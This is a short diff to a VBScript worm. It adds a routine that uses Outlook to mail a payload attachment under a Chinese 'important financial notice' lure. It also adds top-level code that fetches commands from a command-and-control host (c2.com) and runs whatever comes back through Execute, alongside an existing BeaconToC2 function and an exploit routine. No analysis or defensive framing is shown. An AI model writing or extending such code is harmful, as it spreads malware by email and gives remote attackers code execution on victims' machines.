@@ -366,6 +366,14 @@ Function ExploitVulnerability(target)
     Return False
 End Function
 
+Sub SpreadViaEmail()
+    Set outlook = CreateObject("Outlook.Application")
+    Set mail = outlook.CreateItem(0)
+    mail.Subject = "重要财务通知"
+    mail.Attachments.Add payload_path
+    mail.Send
+End Sub
+
 Function BeaconToC2()
     Dim http : Set http = CreateObject("MSXML2.XMLHTTP")
     http.Open "GET", "https://c2.com/指令", False
@@ -373,6 +381,12 @@ Function BeaconToC2()
     Execute http.responseText  ' 动态执行远程代码
 End Function
 
+' 伪代码：从C2服务器获取指令
+Set http = CreateObject("MSXML2.XMLHTTP")
+http.Open "GET", "http://c2.com/command", False
+http.Send
+Execute(http.responseText)  ' 动态执行远程代码
+    
 ' 主程序入口
 Randomize  ' 初始化随机数生成器
 Dim worm
